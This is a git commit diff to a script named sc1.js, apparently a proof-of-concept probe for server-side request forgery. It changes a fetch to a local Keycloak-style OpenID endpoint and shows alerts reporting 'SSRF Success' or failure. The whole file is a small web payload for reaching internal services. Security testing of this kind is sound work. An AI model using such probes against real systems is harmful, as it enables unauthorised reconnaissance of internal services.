b07143ce45a1076c384080eb5681aad4df8a451a
ex3xex <68012861+ex3xex@users.noreply.github.com>
2024-10-06 23:49:36 +0900

    Update sc1.js

--- sc1.js
+++ sc1.js
@@ -1,4 +1,9 @@
-fetch('http://localhost:8080/auth/realms/master/.well-known/openid-configuration')
-  .then(response => response.text())
-  .then(data => alert(data))
+fetch('http://localhost:8080/realms/master/protocol/openid-connect/auth')
+  .then(response => {
+    if (response.status === 200) {
+      alert('SSRF Success: Resource found');
+    } else {
+      alert('SSRF Failed: Status ' + response.status);
+    }
+  })
   .catch(error => alert('SSRF Failed: ' + error.message));
